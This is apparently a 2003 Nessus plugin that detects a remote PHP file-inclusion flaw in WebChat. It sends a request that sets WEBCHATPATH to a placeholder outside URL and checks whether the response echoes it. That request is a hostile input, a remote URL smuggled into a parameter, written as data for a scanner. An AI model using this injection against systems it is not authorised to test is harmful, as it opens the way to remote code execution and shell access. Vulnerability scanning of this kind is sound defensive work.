#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Ref:
#
# From: "Frog Man" <leseulfrog@hotmail.com>
# To: bugtraq@securityfocus.com
# Cc: vulnwatch@vulnwatch.org
# Date: Mon, 03 Mar 2003 13:57:43 +0100
# Message-ID: <F33JEyTeTaj1qNIFR2e000195ec@hotmail.com>
# Subject: [VulnWatch] WebChat (PHP)

if(description)
{
 script_id(11315);
 script_version ("$Revision$");
 script_bugtraq_id(7000);

 name["english"] = "webchat code injection";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to make the remote host include php files hosted
on a third party server using webchat.

An attacker may use this flaw to inject arbitrary code in the remote
host and gain a shell with the privileges of the web server.

Solution : See http://www.phpsecure.org or contact the vendor for a patch
Risk factor : Serious";




 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of includes.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;
if(!get_port_state(port))exit(0);



function check(loc)
{
 req = http_get(item:string(loc, "/defines.php?WEBCHATPATH=http://xxxxxxxx/"),
 		port:port);			
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if(egrep(pattern:".*http://xxxxxxxx/db_mysql\.php", string:r))
 {
 	security_hole(port);
	exit(0);
 }
}


dir = make_list(cgi_dirs());
foreach d (dir)
{
 if(isnull(dirs))dirs = make_list(string(d, "/webchat"), string(d, "/webchat-077"));
 else dirs = make_list(dirs, string(d, "/webchat"), string(d, "/webchat-077"));
}

dirs = make_list(dirs, "", "/webchat", "/webchat-077");



foreach dir (dirs)
{
 check(loc:dir);
}
